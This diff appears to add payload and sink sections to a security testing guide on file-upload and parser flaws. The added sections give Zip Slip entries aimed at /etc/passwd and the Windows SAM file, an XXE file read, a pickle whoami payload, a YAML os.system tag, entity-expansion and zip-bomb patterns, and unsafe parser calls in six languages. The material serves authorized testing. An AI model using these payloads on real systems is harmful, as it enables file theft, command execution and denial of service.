@@ -30,6 +30,108 @@ The unsafe assumption is that validating the file extension is enough. Magic byt
 | **Resource limits** | Missing caps on entry count, uncompressed size, recursion depth |
 | **Post-parse use** | Parsed objects fed into reflection, scripting, or dynamic SQL |
 
+## Attack Payloads
+
+Use these in authorized tests with crafted files in upload and import features. Confirm parser limits and safe loader settings per format.
+
+### Pattern 1: Zip Slip path traversal (archive abuse scenario)
+
+```text
+# Malicious entry name inside archive
+../../../../etc/passwd
+..\..\windows\system32\config\sam
+```
+
+### Pattern 2: XML external entity (XXE)
+
+```xml
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+```
+
+### Pattern 3: Billion laughs / entity expansion
+
+```xml
+<!ENTITY a "aaaa...">
+<!ENTITY b "&a;&a;...">
+```
+
+### Pattern 4: Unsafe deserialization in file body
+
+```python
+# pickle magic bytes in uploaded .dat
+cos\nsystem\n(S'whoami'\ntR.
+```
+
+### Pattern 5: YAML unsafe load
+
+```yaml
+!!python/object/apply:os.system ['id']
+```
+
+### Pattern 6: Zip bomb and nested archives
+
+```text
+42.zip containing 42.zip × N with huge uncompressed size
+```
+
+## Language-Specific Sinks and Dangerous APIs
+
+Search for parsers that enable dangerous features on untrusted input.
+
+### Python
+
+```python
+zipfile.ZipFile(path).extractall(dest)  # no path check
+yaml.load(data)  # use yaml.safe_load
+pickle.load(f)
+xml.etree.ElementTree.parse(path)  # XXE risk in some configs
+lxml.etree.parse(path)
+```
+
+`tarfile.extractall`, `PIL.Image.open` without size limits, `pdfplumber` on hostile PDFs.
+
+### Java
+
+```java
+new ObjectInputStream(in).readObject();
+DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(in);
+ZipInputStream zis; zis.getNextEntry(); Files.copy(..., Paths.get(dest, entry.getName()));
+```
+
+`XMLInputFactory` without `ACCESS_EXTERNAL_DTD` disabled; Apache POI on macro-enabled Office files.
+
+### C#
+
+```csharp
+BinaryFormatter.Deserialize(stream);
+new XmlDocument().Load(path);
+ZipFile.ExtractToDirectory(archive, dest);
+```
+
+### JavaScript
+
+```javascript
+const zip = await JSZip.loadAsync(buffer);
+zip.file(entry.name).async("uint8array");  // entry.name may contain ../
+yaml.load(str);
+```
+
+### Go
+
+```go
+archive/zip.OpenReader(path)  // extract without filepath.Clean check
+xml.Unmarshal(data, &v)  // verify decoder limits
+```
+
+### C / native
+
+```c
+unzip(file, dest_dir);  // no canonical path check
+```
+
 ## Sample Vulnerable Code in Python
 
 ```python
